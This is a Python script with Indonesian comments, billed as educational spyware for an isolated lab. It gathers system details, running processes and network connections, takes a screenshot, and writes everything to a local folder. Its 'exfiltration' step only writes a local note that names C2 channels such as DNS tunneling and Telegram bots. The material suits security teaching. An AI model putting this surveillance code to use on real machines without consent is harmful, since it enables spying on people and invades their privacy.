"""
edu_spyware.py
Spyware EDUKASI - demonstrasi konsep information gathering.
HANYA untuk lab keamanan jaringan yang terisolasi.

Install dependencies:
    pip install pillow psutil requests
"""

import os
import sys
import time
import socket
import platform
import getpass
import psutil
from datetime import datetime

# Folder output (di lab, gunakan folder terisolasi)
OUTPUT_DIR = os.path.join(os.getcwd(), "edu_spyware_output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

def banner():
    print("=" * 65)
    print(" EDU SPYWARE - Keamanan Jaringan Lab")
    print(" Komponen: System Info + Process List + Network Info")
    print(" Output :", OUTPUT_DIR)
    print("=" * 65)

# ============================================================
# MODUL 1: Information Gathering (System Reconnaissance)
# ============================================================
def gather_system_info():
    """Kumpulkan informasi sistem - teknik dasar spyware."""
    info = {
        "timestamp": datetime.now().isoformat(),
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.system(),
        "os_version": platform.version(),
        "os_release": platform.release(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "python_version": platform.python_version(),
        "cwd": os.getcwd(),
        "ip_local": socket.gethostbyname(socket.gethostname()),
        "mac_address": hex(psutil.Process().pid),  # placeholder
    }
    
    # Coba dapatkan MAC address asli
    try:
        import uuid
        info["mac_address"] = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                                         for i in range(0, 48, 8)][::-1])
    except Exception:
        pass
    
    return info

def save_system_info():
    info = gather_system_info()
    path = os.path.join(OUTPUT_DIR, "system_info.txt")
    with open(path, "w", encoding="utf-8") as f:
        for k, v in info.items():
            f.write(f"{k:20s}: {v}\n")
    print(f"[+] System info disimpan: {path}")
    return info

# ============================================================
# MODUL 2: Process Enumeration (mendeteksi aplikasi berjalan)
# ============================================================
def enumerate_processes():
    """List semua process berjalan - teknik spyware untuk profiling target."""
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
        try:
            processes.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    
    path = os.path.join(OUTPUT_DIR, "processes.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"{'PID':<8}{'NAME':<30}{'USER':<20}{'CPU%':<8}{'MEM%':<8}\n")
        f.write("-" * 80 + "\n")
        for p in processes:
            f.write(f"{p['pid']:<8}{p['name'][:28]:<30}"
                    f"{str(p['username'])[:18]:<20}"
                    f"{p['cpu_percent'] or 0:<8.1f}{p['memory_percent'] or 0:<8.2f}\n")
    print(f"[+] Process list disimpan: {path} ({len(processes)} proses)")
    return processes

# ============================================================
# MODUL 3: Network Connection Discovery
# ============================================================
def enumerate_network():
    """List koneksi jaringan aktif - teknik spyware untuk C2 discovery."""
    connections = []
    for conn in psutil.net_connections(kind='inet'):
        try:
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "-"
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
            connections.append({
                "fd": conn.fd,
                "family": "IPv4" if conn.family.name == "AF_INET" else "IPv6",
                "type": conn.type.name,
                "status": conn.status,
                "local": laddr,
                "remote": raddr,
                "pid": conn.pid,
            })
        except Exception:
            continue
    
    path = os.path.join(OUTPUT_DIR, "network_connections.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"{'PROTO':<8}{'LOCAL':<28}{'REMOTE':<28}{'STATUS':<15}{'PID':<8}\n")
        f.write("-" * 90 + "\n")
        for c in connections:
            f.write(f"{c['type']:<8}{c['local'][:26]:<28}"
                    f"{c['remote'][:26]:<28}{c['status']:<15}{c['pid'] or '-':<8}\n")
    print(f"[+] Network connections disimpan: {path} ({len(connections)} koneksi)")
    return connections

# ============================================================
# MODUL 4: Screenshot Capture (screen capture - spyware inti)
# ============================================================
def capture_screenshot():
    """Screenshot layar - komponen pengawasan visual spyware."""
    try:
        from PIL import ImageGrab
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(OUTPUT_DIR, f"screenshot_{timestamp}.png")
        img = ImageGrab.grab()
        img.save(path)
        print(f"[+] Screenshot disimpan: {path}")
        return path
    except ImportError:
        print("[!] PIL/Pillow tidak terinstall. Skip screenshot.")
        return None

# ============================================================
# MODUL 5: Simulasi Exfiltration (LOKAL - tidak ke internet!)
# ============================================================
def simulate_exfiltration():
    """
    Simulasi exfiltrasi - HANYA menulis marker ke file lokal.
    TIDAK mengirim data ke internet (agar tidak melanggar hukum).
    """
    marker = os.path.join(OUTPUT_DIR, "_exfil_simulated.txt")
    with open(marker, "w") as f:
        f.write(f"[SIMULASI EXFILTRASI]\n")
        f.write(f"Timestamp: {datetime.now().isoformat()}\n")
        f.write(f"Note: Di malware asli, data ini dikirim ke C2 server\n")
        f.write(f"      via HTTP POST / DNS tunneling / Telegram Bot API.\n")
        f.write(f"      Di lab ini, TIDAK ada koneksi keluar.\n")
    print(f"[+] Simulasi exfiltrasi (lokal): {marker}")

# ============================================================
# MAIN
# ============================================================
def main():
    banner()
    print("\n[*] Menjalankan modul spyware EDU...\n")
    
    save_system_info()
    enumerate_processes()
    enumerate_network()
    capture_screenshot()
    simulate_exfiltration()
    
    print("\n[✓] Selesai. Cek folder:", OUTPUT_DIR)
    print("[!] Ingat: ini HANYA demonstrasi untuk pembelajaran.\n")

if __name__ == "__main__":
    main()